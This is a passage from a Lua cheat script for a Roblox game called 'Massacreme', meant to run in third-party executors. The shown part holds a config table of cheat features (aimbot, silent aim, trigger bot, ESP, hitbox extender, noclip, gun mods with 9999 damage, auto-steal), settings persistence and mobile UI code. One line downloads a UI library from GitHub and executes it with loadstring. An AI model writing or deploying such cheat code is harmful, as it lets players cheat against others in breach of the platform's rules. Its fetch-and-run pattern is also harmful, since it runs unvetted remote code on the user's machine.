        if _discordBtn and _discordBtn.Parent then _discordBtn.Text="Join Discord" end
    end)
end)

-- Exit
_exitBtn.MouseButton1Click:Connect(function()
    _loaderDone      = true
    _launchCallback  = nil
    if _starConn then _starConn:Disconnect() end
    _loaderGui:Destroy()
end)

end)()  -- end key screen scope ──────────────────────────────────────────

-- ════════════════════════════════════════════════════════════════════════
-- MAIN SCRIPT  (fires once user passes the key screen)
-- ════════════════════════════════════════════════════════════════════════
_launchCallback = function()

-- ══════════════════════════════════════════════════════════════════════
-- LOAD UILIB
-- ══════════════════════════════════════════════════════════════════════
-- used for updating stuff easier

--[[
-- START OF UILIB
local UILib = [=[

]=]
-- END OF UILIB
--]]

local UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/zynviiy/fyghg/refs/heads/main/UILib.lua"))() 
--UILib = loadstring(UILib)()

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG TABLE
-- ══════════════════════════════════════════════════════════════════════
local cfg = {
    -- Movement
    Speed               = 46,
    SpeedEnabled        = false,
    NoclipEnabled       = false,
    InfiniteJumpEnabled = false,
    NoJumpCD            = false,
    InfiniteStamina     = false,
    SprintSpeed         = 22,
    -- ESP
    ESPEnabled          = false,
    ESPChams            = false,
    ESPOutlines         = true,
    ESPTracers          = false,
    PlayerLabels        = false,
    PlayerLabelSize     = 14,
    ItemESPEnabled      = false,
    ItemChamsEnabled    = true,
    ItemESPLabels       = true,
    ItemESPTracers      = false,
    KillerESPOnly       = false,
    ShowTeammates       = true,
    BearTrapESP         = false,
    -- Aimbot
    AimbotEnabled       = false,
    AimbotTeamCheck     = false,
    AimbotVisibleCheck  = false,
    AimLockEnabled      = false,
    FOVCircleEnabled    = true,
    FOV                 = 150,
    Smoothness          = 0.10,
    -- Hitbox
    HitboxEnabled       = false,
    HitboxSize          = 8,
    -- Auto features
    AutoBandageEnabled  = false,
    AutoBloxyEnabled    = false,
    AutoFlashEnabled    = false,
    AutoVestEnabled     = false,
    AutoStealEnabled    = false,
    TriggerBotEnabled   = false,
    TB_TeamCheck        = false,
    KnifeEnabled        = false,
    BiteEnabled         = false,
    KnifeVisible        = true,
    PepperEnabled       = false,
    WalkFlingEnabled    = false,
    KnifeWalkFlingEnabled = false,
    SafeQuestEnabled    = false,
    -- Combat
    GunModEnabled       = false,
    SilentAimEnabled    = false,
    SA_TeamCheck        = false,
    SA_VisibleCheck     = false,
    SA_TargetPart       = "HumanoidRootPart",
    SA_Method           = "Raycast",
    SA_HitChance        = 100,
    SA_Prediction       = false,
    SA_PredictionAmount = 0.165,
    SA_ShowFOV          = false,
    SA_FOVRadius        = 130,
    SA_ShowTarget       = false,
    SA_FOVColor         = Color3.fromRGB(54, 57, 241),
    GunMod_Damage          = 9999,
    GunMod_FireRate        = 0.030,
    GunMod_MagazineSize    = 10000,
    GunMod_Range           = 1000000,
    GunMod_ReloadTime      = 0,
    GunMod_ImpactForce     = 1000000,
    GunMod_Spread          = 0,
    GunMod_AimSpread       = 0,
    GunMod_AimRecoilMult   = 0,
    GunMod_HeadshotMult    = 100,
    GunMod_LimbMult        = 50,
    GunMod_ForceAuto       = true,
    -- Settings
    TipsEnabled         = true,
    InstantPrompt       = false,
    AntiAFKEnabled      = false,
    FullbrightEnabled   = false,
    TargetHUDEnabled    = true,
    DeleteZonesEnabled  = false,
    DesyncEnabled       = false,
    DisableFlashEnabled = false,
    GameUIRecolor       = false,
    InstantBearTrap     = false,
    -- ESP Colors
    ESPColorKiller          = Color3.fromRGB(255, 55,  55),
    ESPColorSurvivor        = Color3.fromRGB(0, 220, 100),
    ESPColorSpectator       = Color3.fromRGB(150, 150, 150),
    ESPColorTeammate        = Color3.fromRGB(200, 80, 255),
    ESPColorPlacedBearTrap  = Color3.fromRGB(255, 70,  70),
    ESPColorItem            = Color3.fromRGB(210,210, 210),
    ESPColorBearTrap        = Color3.fromRGB(255, 112, 112),
    ESPColorBandage         = Color3.fromRGB(255,240, 100),
    ESPColorBloxyCola       = Color3.fromRGB( 80,160, 255),
    ESPColorMetalPipe       = Color3.fromRGB(190,190, 190),
    ESPColorPepper          = Color3.fromRGB(255,140,   0),
    AimbotColorFOV          = Color3.fromRGB(  0,255, 100),
    -- UI Theme
    Accent    = Color3.fromRGB(0, 220, 100),
    AccentDim = Color3.fromRGB(0, 150,  65),
    BG        = Color3.fromRGB(14, 15, 20),
    BG2       = Color3.fromRGB(20, 22, 30),
    BG3       = Color3.fromRGB(28, 30, 42),
    Stroke    = Color3.fromRGB(50, 55, 75),
    Text      = Color3.fromRGB(230,235,255),
    Muted     = Color3.fromRGB(140,148,180),
}

-- ── Settings persistence ─────────────────────────────────────────────────
-- Saves all boolean + number cfg keys to massacreme_cfg.txt.
-- Loaded immediately so every toggle/slider starts at its last value.
-- Color3 values are skipped (can't serialize simply).
local _cfgFile = "massacreme_cfg.txt"
local function _saveCfg()
    if not writefile then return end
    local lines = {}
    for k, v in pairs(cfg) do
        local t = type(v)
        if t == "boolean" then
            table.insert(lines, k .. "=b:" .. tostring(v))
        elseif t == "number" then
            table.insert(lines, k .. "=n:" .. tostring(v))
        end
    end
    -- save keybinds
    if keybinds then
        for k, v in pairs(keybinds) do
            if typeof(v) == "EnumItem" then
                table.insert(lines, "kb_" .. k .. "=k:" .. v.Name)
            end
        end
    end
    pcall(writefile, _cfgFile, table.concat(lines, "\n"))
end
local function _loadCfg()
    if not readfile then return end
    local ok, content = pcall(readfile, _cfgFile)
    if not ok or not content or content == "" then return end
    for line in content:gmatch("[^\n]+") do
        local k, typ, v = line:match("^(%w+)=(%a):(.+)$")
        if k and typ and v and cfg[k] ~= nil then
            if   typ == "b" then cfg[k] = (v == "true")
            elseif typ == "n" then local n = tonumber(v); if n then cfg[k] = n end
            end
        end
    end
end
_loadCfg()
-- Autosave every 5 s
local _cfgSaveTick = 0
RunService.Heartbeat:Connect(function(dt)
    _cfgSaveTick = _cfgSaveTick + dt
    if _cfgSaveTick < 5 then return end
    _cfgSaveTick = 0
    _saveCfg()
end)

local KNIFE = { RATE=0.3, SIDE_OFF=0.5, VERT_OFF=0.0, BACK_OFF=1.5, ENGAGE_HP=100 }
local _AUTO = { BANDAGE_HP=60, BLOXY_HP=60, FLASH_RANGE=30, TRIGGER_RATE=0.15, bearTrapHighlights={}, stealConn=nil, vestEquipConn=nil, gunModConn=nil, reloadConn=nil, fullbrightConn=nil, fullbrightChildConn=nil, fullbrightMapConn=nil }
-- Gun mod original values — saved before first patch so _xgM() can restore them
local _gmOriginals  = {}   -- [tableRef] = { field = origVal, ... }
local _gmGlobalOrig = {}   -- [globalRef] = { HeadshotMultiplier=v, LimbMultiplier=v }

-- ── getgc support check ──────────────────────────────────────────────────
-- Gun mods, auto reload, and several other features rely on getgc(true).
-- Run one probe at startup: if getgc is missing or returns a non-table,
-- _gcSupported stays false and those features disable themselves gracefully
-- instead of crashing mid-Heartbeat on unsupported executors.
local _gcSupported = (function()
    if type(getgc) ~= "function" then return false end
    local ok, result = pcall(getgc, true)
    return ok and type(result) == "table"
end)()
-- ────────────────────────────────────────────────────────────────────────

local _sIS, _xIS, staminaTrack
local _sSQ, _xSQ, doQuestNow
local _sAS, _xAS, startAutoVest, stopAutoVest
local _sgM, _xgM, startAutoReload, stopAutoReload
local _rIC  -- forward-declared so mobile quickbar closure can reference it
local itemCollectRunning = false
local _sHN  -- hit notification panel (defined in MISC TAB FUNCTIONS)

local keybinds = {
    SpeedToggle      = Enum.KeyCode.F,
    NoclipToggle     = Enum.KeyCode.H,
    UI_Toggle        = Enum.KeyCode.RightShift,
    DoQuest          = Enum.KeyCode.G,
    TriggerToggle    = Enum.KeyCode.J,
    AimLockToggle    = Enum.KeyCode.K,
    AutoCollectToggle = Enum.KeyCode.C,
}
-- load saved keybinds now that the table exists
do
    if readfile then
        local ok, content = pcall(readfile, _cfgFile)
        if ok and content and content ~= "" then
            for line in content:gmatch("[^\n]+") do
                local k, typ, v = line:match("^(kb_%w+)=(k):(.+)$")
                if k and typ and v then
                    local kbKey = k:sub(4)
                    if keybinds[kbKey] ~= nil then
                        local enumOk, enumVal = pcall(function() return Enum.KeyCode[v] end)
                        if enumOk and enumVal then keybinds[kbKey] = enumVal end
                    end
                end
            end
        end
    end
end

local keyCapture    = { active = false, action = nil, label = nil }
local spectateTarget  = nil
local activeTab       = nil
local _qbContainerRef = nil  -- set in mobile block; used by target HUD to anchor below bar

-- Sync functions: keybinds call these to update toggle visuals externally
-- Populated when each tab renders its toggles
-- keybinds already synced, so no need - bob
local syncFns = {
    --SpeedEnabled    = nil,
    --NoclipEnabled   = nil,
    --TriggerBotEnabled = nil,
}

-- Feature backend functions: called by quickbar toggle to start/stop features
-- that need explicit function calls (not self-managing Heartbeat loops)
-- Populated in SETTINGS FEATURE INIT after all functions are defined
local featureFns = {}

-- ══════════════════════════════════════════════════════════════════════
local TIPS = {
    "Tip: Killer ESP shows red - always visible through walls.",
    "Tip: Use Hitbox Extender to make enemies easier to hit.",
    "Tip: Auto Knife fires at the killer automatically.",
    "Tip: Spectate any player from the Viewer tab.",
    "Tip: Instant Prompts sets HoldDuration=0.",
    "Tip: Item ESP Labels & Tracers can be toggled separately.",
    "Tip: GoTo teleports you behind a player.",
    "Tip: Steal grabs Push/Super Push from another player.",
    "Tip: No Clip strips CanCollide every physics step.",
    "Tip: Speed works on WASD - pushes your CFrame forward.",
    "Tip: Remove Killparts during spawn phase.",
    "Tip: Squad-mates show purple in ESP.",
    "Tip: RightShift toggles this menu.",
}

-- ══════════════════════════════════════════════════════════════════════
-- LOADING SCREEN → then build UI
-- ══════════════════════════════════════════════════════════════════════
UILib.showLoadingScreen(PlayerGui, "Massacreme", "Loading features...", TIPS, function()

    -- Clean up any previous GUI
    for _, g in ipairs(game.CoreGui:GetChildren()) do
        if g.Name == "Massacreme_UILib" then g:Destroy() end
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "Massacreme_UILib"
    ScreenGui.Parent = game:GetService("CoreGui")
    ScreenGui.Name             = "Massacreme_UILib"
    ScreenGui.ResetOnSpawn     = false
    ScreenGui.IgnoreGuiInset   = true
    ScreenGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
    ScreenGui.DisplayOrder     = 999
    ScreenGui.OnTopOfCoreBlur  = true

    -- Main panel
    local main = Instance.new("CanvasGroup", ScreenGui)
    main.Name = "Main"
    main.Name             = "Main"
    main.Size             = UDim2.fromOffset(720, 520)
    main.Position         = UDim2.fromScale(0.5, 0.5)
    main.AnchorPoint      = Vector2.new(0.5, 0.5)
    main.BackgroundColor3 = cfg.BG
    main.BorderSizePixel  = 0

    UILib.addCorner(main, 16)
    UILib.addStroke(main, 1.5, cfg.Accent, 0.4)

    -- Header
    local header = Instance.new("Frame", main)
    header.Name = "Header"
    header.Size             = UDim2.new(1, 0, 0, 66)
    header.BackgroundTransparency = 1

    local logoBadge = Instance.new("Frame", header)
    logoBadge.Name = "LogoBadge"
    logoBadge.Size             = UDim2.fromOffset(44, 44)
    logoBadge.Position         = UDim2.fromOffset(12, 11)
    logoBadge.BackgroundColor3 = Color3.fromRGB(10, 80, 40)
    logoBadge.BorderSizePixel  = 0
    logoBadge.ZIndex           = 3
    do
        UILib.addCorner(logoBadge, 12)
        UILib.addStroke(logoBadge, 2, Color3.fromRGB(0, 220, 100), 0.2)
        local lbl = Instance.new("TextLabel", logoBadge)
        lbl.Name = "LogoText"
        lbl.Size               = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Font               = Enum.Font.GothamBlack
        lbl.TextSize           = 26
        lbl.TextColor3         = Color3.fromRGB(0, 240, 110)
        lbl.Text               = "M"
        lbl.TextXAlignment     = Enum.TextXAlignment.Center
        lbl.TextYAlignment     = Enum.TextYAlignment.Center
        lbl.BorderSizePixel    = 0
        lbl.ZIndex             = 4
    end

    local titleLbl = Instance.new("TextLabel", header)
    titleLbl.Name = "Title"
    titleLbl.Size     = UDim2.fromOffset(160, 30)
    titleLbl.Position = UDim2.fromOffset(47, 8)
    titleLbl.BackgroundTransparency = 1
    titleLbl.Font     = Enum.Font.GothamBold
    titleLbl.TextSize = 22
    titleLbl.TextColor3 = cfg.Accent
    titleLbl.Text     = "Massacreme"

    local privateBadge = Instance.new("TextLabel", header)
    privateBadge.Name = "PrivateBadge"
    privateBadge.Size             = UDim2.fromOffset(64, 20)
    privateBadge.Position         = UDim2.fromOffset(195, 13)
    privateBadge.BackgroundColor3 = Color3.fromRGB(180, 140, 0)
    privateBadge.TextColor3       = Color3.fromRGB(255, 240, 160)
    privateBadge.Font             = Enum.Font.GothamBold
    privateBadge.TextSize         = 11
    privateBadge.Text             = "PRIVATE"
    privateBadge.BorderSizePixel  = 0
    UILib.addCorner(privateBadge, 6)

    local verLbl = Instance.new("TextLabel", header)
    verLbl.Name = "Version"
    verLbl.Size               = UDim2.fromOffset(40, 20)
    verLbl.Position           = UDim2.fromOffset(266, 14)
    verLbl.BackgroundTransparency = 1
    verLbl.Font               = Enum.Font.Gotham
    verLbl.TextSize           = 11
    verLbl.TextColor3         = cfg.Muted
    verLbl.Text               = "v1.0"
    verLbl.TextXAlignment     = Enum.TextXAlignment.Left
    verLbl.BorderSizePixel    = 0

    local subLbl = Instance.new("TextLabel", header)
    subLbl.Name = "Subtitle"
    subLbl.Size     = UDim2.new(1, -72, 0, 18)
    subLbl.Position = UDim2.fromOffset(66, 38)
    subLbl.BackgroundTransparency = 1
    subLbl.Font     = Enum.Font.Gotham
    subLbl.TextSize = 12
    subLbl.TextColor3 = cfg.Muted
    subLbl.Text     = "Massacreme Management"
    subLbl.TextXAlignment = Enum.TextXAlignment.Left

    -- ── Title glow effect (pulses every 7s) ──────────────────────────────
    do
        local glowTimer = 0
        local glowPhase = 0
        local glowState = 0   -- 0=idle  1=fade-in  2=hold  3=fade-out
        local GLOW_EVERY = 7
        local GLOW_COLOR = Color3.fromRGB(255, 230, 80)
        titleLbl.TextStrokeTransparency = 1
        RunService.Heartbeat:Connect(function(dt)
            if not titleLbl or not titleLbl.Parent then return end
            glowTimer = glowTimer + dt
            if glowState == 0 then
                if glowTimer >= GLOW_EVERY then
                    glowTimer = 0; glowState = 1; glowPhase = 0
                    titleLbl.TextStrokeColor3 = GLOW_COLOR
                end
            elseif glowState == 1 then          -- fade in
                glowPhase = glowPhase + dt / 0.35
                local t = math.min(glowPhase, 1)
                titleLbl.TextStrokeTransparency = 1 - t * 0.75
                if t >= 1 then glowState = 2; glowPhase = 0 end
            elseif glowState == 2 then          -- hold
                glowPhase = glowPhase + dt
                if glowPhase >= 0.4 then glowState = 3; glowPhase = 0 end
            elseif glowState == 3 then          -- fade out
                glowPhase = glowPhase + dt / 0.5
                local t = math.min(glowPhase, 1)
                titleLbl.TextStrokeTransparency = 0.25 + t * 0.75
                if t >= 1 then
                    glowState = 0; glowTimer = 0
                    titleLbl.TextStrokeTransparency = 1
                end
            end
        end)
    end

    -- ── Title death flicker (red flash on local player death) ────────────
    do
        local flickerActive = false
        local RED = Color3.fromRGB(220, 40, 40)
        local function startDeathFlicker()
            if flickerActive then return end
            flickerActive = true
            task.spawn(function()
                local deadline = tick() + 3.5
                local orig = cfg.Accent
                while tick() < deadline do
                    if not titleLbl or not titleLbl.Parent then break end
                    titleLbl.TextColor3 = RED
                    task.wait(0.12)
                    if not titleLbl or not titleLbl.Parent then break end
                    titleLbl.TextColor3 = Color3.fromRGB(15, 15, 15)
                    task.wait(0.08)
                end
                if titleLbl and titleLbl.Parent then
                    titleLbl.TextColor3 = orig
                end
                flickerActive = false
            end)
        end
        local function hookDeathOnChar(char)
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
                     or char:WaitForChild("Humanoid", 4)
            if not hum then return end
            hum.Died:Connect(startDeathFlicker)
        end
        if LocalPlayer.Character then hookDeathOnChar(LocalPlayer.Character) end
        LocalPlayer.CharacterAdded:Connect(hookDeathOnChar)
    end

    -- Tab shell
    local tabShell = Instance.new("Frame", main)
    tabShell.Name = "TabShell"
    tabShell.Size             = UDim2.new(1, -24, 0, 40)
    tabShell.Position         = UDim2.fromOffset(12, 72)
    tabShell.BackgroundColor3 = cfg.BG2
    tabShell.BorderSizePixel  = 0
    UILib.addCorner(tabShell, 12)
    UILib.addStroke(tabShell, 1, cfg.Stroke, 0.3)

    local tabScroller = Instance.new("ScrollingFrame", tabShell)
    tabScroller.Name = "TabScroller"
    tabScroller.Size             = UDim2.new(1, -12, 1, 0)
    tabScroller.Position         = UDim2.fromOffset(6, 0)
    tabScroller.BackgroundTransparency = 1
    tabScroller.BorderSizePixel  = 0
    tabScroller.ScrollBarThickness = 0
    tabScroller.ScrollingDirection = Enum.ScrollingDirection.X
    tabScroller.CanvasSize       = UDim2.new(0, 0, 0, 0)

    local tabLayout = Instance.new("UIListLayout", tabScroller)
    tabLayout.FillDirection       = Enum.FillDirection.Horizontal
    tabLayout.SortOrder           = Enum.SortOrder.LayoutOrder
    tabLayout.Padding             = UDim.new(0, 5)
    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    tabLayout.VerticalAlignment   = Enum.VerticalAlignment.Center
    local tabPad = Instance.new("UIPadding", tabScroller)
    tabPad.PaddingLeft = UDim.new(0, 4); tabPad.PaddingRight = UDim.new(0, 4)
    tabLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        local pad = 10
        tabScroller.CanvasSize = UDim2.new(0, tabLayout.AbsoluteContentSize.X + pad, 0, 0)
    end)

    -- Content frame
    local content = Instance.new("ScrollingFrame", main)
    content.Name = "ContentFrame"
    content.Size             = UDim2.new(1, -24, 1, -130)
    content.Position         = UDim2.fromOffset(12, 120)
    content.BackgroundTransparency = 1
    content.BorderSizePixel  = 0
    content.ScrollBarThickness = 5
    content.ScrollBarImageColor3 = cfg.Accent
    content.ScrollBarImageTransparency = 0.25
    content.ScrollingDirection = Enum.ScrollingDirection.Y
    content.CanvasSize       = UDim2.new(0, 0, 0, 0)

    local contentLayout = Instance.new("UIListLayout", content)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    contentLayout.Padding   = UDim.new(0, 8)
    contentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        local pad = 20
        content.CanvasSize = UDim2.new(0, 0, 0, contentLayout.AbsoluteContentSize.Y + pad)
    end)
    local contentPad = Instance.new("UIPadding", content)
    contentPad.PaddingBottom = UDim.new(0, 14)
    contentPad.PaddingTop    = UDim.new(0, 6)
    contentPad.PaddingLeft   = UDim.new(0, 6)
    contentPad.PaddingRight  = UDim.new(0, 11)  -- 5px scrollbar + 6px margin so buttons don't clip

    -- Init UILib
    UILib.init(cfg, content, ScreenGui, {
        UIS          = UserInputService,
        Camera       = Camera,
        scheduleSave = function() end,
        keyCapture   = keyCapture,
        keybinds     = keybinds,
    })

    UILib.makeDraggable(main, header, 15)

    -- ════════════════════════════════════════════════════════════
    -- MOBILE SUPPORT
    -- ════════════════════════════════════════════════════════════
    if _isMobile then
        -- Hide all keybind setter rows on mobile — keybinds don't apply to touch
        UILib.keybindRow = function() end
        -- Replace keybindToggleRow with a plain toggle so features still work
        UILib.keybindToggleRow = function(label, _, cfgKey, cb)
            local t = UILib.createToggle(label, cfg[cfgKey], function(v)
                cfg[cfgKey] = v
                if cb then cb() end
            end)
            return { SyncToggle = t and t.Sync or function() end }
        end
        -- Scale main panel to fit mobile viewport
        local vp = workspace.CurrentCamera.ViewportSize
        local scale = math.min((vp.X * 0.863636363636) / 720, (vp.Y * 0.80) / 520, 1)
        local uiScale = Instance.new("UIScale", main)
        uiScale.Scale = scale

        -- Re-apply scale whenever viewport changes (rotation, keyboard popup, etc.)
        local function _applyMobileScale()
            local cvp = workspace.CurrentCamera.ViewportSize
            uiScale.Scale = math.min((cvp.X * 0.863636363636) / 720, (cvp.Y * 0.80) / 520, 1)
            -- keep panel anchored top-center within new viewport
            main.AnchorPoint = Vector2.new(0.5, 0)
            main.Position = UDim2.new(0.5, 0, 0, 6)
            -- recalc tab scroller canvas padding
            local tabPad2 = 10
            tabScroller.CanvasSize = UDim2.new(0, tabLayout.AbsoluteContentSize.X + tabPad2, 0, 0)
            -- recalc content canvas padding
            local cPad2 = 20
            content.CanvasSize = UDim2.new(0, 0, 0, contentLayout.AbsoluteContentSize.Y + cPad2)
        end
        workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(_applyMobileScale)

        -- Thicker scrollbar so it's grabbable on touch screens
        content.ScrollBarThickness = 10

        -- Reposition to top-center
        main.AnchorPoint = Vector2.new(0.5, 0)
        main.Position = UDim2.new(0.5, 0, 0, 6)
        -- NOTE: main.Visible = false is set AFTER all tabs render (see below)
        -- so UILib AbsoluteSize calculations work correctly during init

        -- ── Floating Action Button (FAB) ─────────────────────────────────
        local fabGui = Instance.new("ScreenGui")
        fabGui.Name = "Massacreme_FAB"
        fabGui.ResetOnSpawn = false
        fabGui.IgnoreGuiInset = true
        fabGui.DisplayOrder = 1000
        fabGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        fabGui.Parent = game:GetService("CoreGui")

        local fab = Instance.new("TextButton", fabGui)
        fab.Size = UDim2.fromOffset(54, 54)
        fab.Position = UDim2.new(1, -70, 1, -80)
        fab.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
        fab.BorderSizePixel = 0
        fab.Text = "M"
        fab.TextColor3 = Color3.fromRGB(255, 255, 255)
        fab.Font = Enum.Font.GothamBlack
        fab.TextSize = 22
        fab.ZIndex = 10
        Instance.new("UICorner", fab).CornerRadius = UDim.new(0, 27)
        local fabStroke = Instance.new("UIStroke", fab)
        fabStroke.Color = Color3.fromRGB(0, 240, 110)
        fabStroke.Thickness = 2

        -- FAB drag: uses UserInputService globally so mouse leaving button doesn't break drag
        local fabDragging, fabDragStart, fabAbsStart = false, nil, nil
        local fabDragMoved = false
        local _UIS_m = game:GetService("UserInputService")

        fab.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.Touch
            or inp.UserInputType == Enum.UserInputType.MouseButton1 then
                fabDragging  = true
                fabDragMoved = false
                fabDragStart = Vector2.new(inp.Position.X, inp.Position.Y)
                fabAbsStart  = Vector2.new(fab.AbsolutePosition.X, fab.AbsolutePosition.Y)
            end
        end)
        -- Global InputChanged — tracks mouse even when it leaves the button
        _UIS_m.InputChanged:Connect(function(inp)
            if not fabDragging then return end
            if inp.UserInputType ~= Enum.UserInputType.Touch
            and inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
            local dx = inp.Position.X - fabDragStart.X
            local dy = inp.Position.Y - fabDragStart.Y
            if math.abs(dx) > 5 or math.abs(dy) > 5 then fabDragMoved = true end
            local ax = math.clamp(fabAbsStart.X + dx, 0, workspace.CurrentCamera.ViewportSize.X - 54)
            local ay = math.clamp(fabAbsStart.Y + dy, 0, workspace.CurrentCamera.ViewportSize.Y - 54)
            fab.Position = UDim2.fromOffset(ax, ay)
        end)
        _UIS_m.InputEnded:Connect(function(inp)
            if inp.UserInputType ~= Enum.UserInputType.Touch
            and inp.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
            if fabDragging then
                if not fabDragMoved then
                    main.Visible = not main.Visible
                end
                fabDragging = false
            end
        end)

        -- ── Quickbar with pinnable features ──────────────────────────────
        -- All available features that can be pinned to quickbar
        -- Format: { label, cfgKey, defaultPinned, getStateFn, toggleFn }
        -- getStateFn/toggleFn override cfgKey for features not in cfg table
        local QB_ALL = {
            { "Speed",     "SpeedEnabled",       true  },
            { "Noclip",    "NoclipEnabled",       true  },
            { "Trigger",   "TriggerBotEnabled",   true  },
            { "AimLck",    "AimLockEnabled",       true  },
            { "AutoKnife", "KnifeEnabled",         false },
            { "AutoBite",  "BiteEnabled",           false },
            { "ESP",       "ESPEnabled",           false },
            { "Aimbot",    "AimbotEnabled",        false },
            { "Fullbrt",   "FullbrightEnabled",    false },
            { "AntiAFK",   "AntiAFKEnabled",       false },
            { "Bandage",   "AutoBandageEnabled",   false },
            { "Flash",     "AutoFlashEnabled",     false },
            -- Custom entries (not cfg-based)
            { "Collect",   "_collect",             true,
                function() return itemCollectRunning end,
                function()
                    if itemCollectRunning then
                        itemCollectRunning = false
                    else
                        task.spawn(function() _rIC(nil) end)
                    end
                end
            },
            { "Quest",     "_quest",               true,
                function() return false end,  -- quest is one-shot, not a toggle state
                function() if doQuestNow then task.spawn(doQuestNow) end end
            },
        }
        -- Load saved pin config
        local _qbPinned = {}
        pcall(function()
            if readfile then
                local raw = readfile("massacreme_qb.txt")
                if raw and raw ~= "" then
                    for k in raw:gmatch("[^,]+") do _qbPinned[k] = true end
                end
            end
        end)
        if not next(_qbPinned) then
            for _, def in ipairs(QB_ALL) do
                if def[3] then _qbPinned[def[2]] = true end
            end
        end
        local function _saveQbPins()
            pcall(function()
                if writefile then
                    local out = {}
                    for k, v in pairs(_qbPinned) do if v then out[#out+1] = k end end
                    writefile("massacreme_qb.txt", table.concat(out, ","))
                end
            end)
        end

        local qbGui = Instance.new("ScreenGui")
        qbGui.Name = "Massacreme_Quickbar"
        qbGui.ResetOnSpawn = false
        qbGui.IgnoreGuiInset = true
        qbGui.DisplayOrder = 999
        qbGui.Parent = game:GetService("CoreGui")

        -- Container: top-center, horizontal drag only (Y fixed to top)
        local qbContainer = Instance.new("Frame", qbGui)
        qbContainer.BackgroundTransparency = 1
        qbContainer.BorderSizePixel = 0
        qbContainer.AnchorPoint = Vector2.new(0.5, 0)
        qbContainer.Position = UDim2.new(0.5, 0, 0, 8)  -- top-center
        qbContainer.Size = UDim2.fromOffset(300, 46)     -- resized dynamically by AutomaticSize listener
        _qbContainerRef = qbContainer  -- expose to target HUD for mobile anchoring

        -- Horizontal-only drag (Y stays pinned to top)
        local qbDragging, qbDragStartX, qbAbsStartX = false, nil, nil
        local _UIS_qb = game:GetService("UserInputService")
        qbContainer.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.Touch
            or inp.UserInputType == Enum.UserInputType.MouseButton1 then
                qbDragging   = true
                qbDragStartX = inp.Position.X
                qbAbsStartX  = qbContainer.AbsolutePosition.X
            end
        end)
        _UIS_qb.InputChanged:Connect(function(inp)
            if not qbDragging then return end
            if inp.UserInputType ~= Enum.UserInputType.Touch
            and inp.UserInputType ~= Enum.UserInputType.MouseMovement then return end
            local dx = inp.Position.X - qbDragStartX
            local w  = qbContainer.AbsoluteSize.X
            local ax = math.clamp(qbAbsStartX + dx, 0, vp.X - w)
            -- AnchorPoint 0,0 + fixed Y=8
            qbContainer.AnchorPoint = Vector2.new(0, 0)
            qbContainer.Position = UDim2.fromOffset(ax, 8)
        end)
        _UIS_qb.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.Touch
            or inp.UserInputType == Enum.UserInputType.MouseButton1 then
                qbDragging = false
            end
        end)

        -- Picker panel (appears above bar when + tapped)
        local pickerFrame = Instance.new("Frame", qbContainer)
        pickerFrame.Size = UDim2.fromOffset(420, 66)
        pickerFrame.Position = UDim2.fromOffset(0, 0)
        pickerFrame.BackgroundColor3 = Color3.fromRGB(8, 14, 10)
        pickerFrame.BorderSizePixel = 0
        pickerFrame.BackgroundTransparency = 0.08
        pickerFrame.Visible = false
        Instance.new("UICorner", pickerFrame).CornerRadius = UDim.new(0, 12)
        local pickerStroke = Instance.new("UIStroke", pickerFrame)
        pickerStroke.Color = Color3.fromRGB(0, 180, 70)
        pickerStroke.Thickness = 1
        pickerStroke.Transparency = 0.5

        local pickerHint = Instance.new("TextLabel", pickerFrame)
        pickerHint.Size = UDim2.new(1, -10, 0, 16)
        pickerHint.Position = UDim2.fromOffset(8, 3)
        pickerHint.BackgroundTransparency = 1
        pickerHint.Text = "Tap to pin / unpin  •  scroll for more"
        pickerHint.TextColor3 = Color3.fromRGB(90, 120, 100)
        pickerHint.Font = Enum.Font.Gotham
        pickerHint.TextSize = 11
        pickerHint.TextXAlignment = Enum.TextXAlignment.Left
        pickerHint.BorderSizePixel = 0

        local pickerScroll = Instance.new("ScrollingFrame", pickerFrame)
        pickerScroll.Size = UDim2.new(1, -8, 0, 44)
        pickerScroll.Position = UDim2.fromOffset(4, 20)
        pickerScroll.BackgroundTransparency = 1
        pickerScroll.BorderSizePixel = 0
        pickerScroll.ScrollBarThickness = 2
        pickerScroll.ScrollingDirection = Enum.ScrollingDirection.X
        pickerScroll.CanvasSize = UDim2.fromOffset(#QB_ALL * 74, 0)
        local pickerLayout = Instance.new("UIListLayout", pickerScroll)
        pickerLayout.FillDirection = Enum.FillDirection.Horizontal
        pickerLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        pickerLayout.Padding = UDim.new(0, 4)

        -- Quickbar button row — original size, scrollable via ScrollingFrame wrapper
        local qbMaxW = math.min(vp.X - 20, 520)  -- max width before scrolling kicks in
        local qbScroll = Instance.new("ScrollingFrame", qbContainer)
        qbScroll.Size = UDim2.fromOffset(qbMaxW, 46)
        qbScroll.Position = UDim2.fromOffset(0, 0)
        qbScroll.BackgroundColor3 = Color3.fromRGB(8, 14, 10)
        qbScroll.BackgroundTransparency = 0.15
        qbScroll.BorderSizePixel = 0
        qbScroll.ScrollBarThickness = 0
        qbScroll.ScrollingDirection = Enum.ScrollingDirection.X
        qbScroll.CanvasSize = UDim2.fromOffset(0, 0)  -- updated after rebuild
        qbScroll.ClipsDescendants = true
        Instance.new("UICorner", qbScroll).CornerRadius = UDim.new(0, 14)
        local qbScrollStroke = Instance.new("UIStroke", qbScroll)
        qbScrollStroke.Color = Color3.fromRGB(0, 200, 80)
        qbScrollStroke.Thickness = 1.2
        qbScrollStroke.Transparency = 0.4

        local qbFrame = Instance.new("Frame", qbScroll)
        qbFrame.BackgroundTransparency = 1
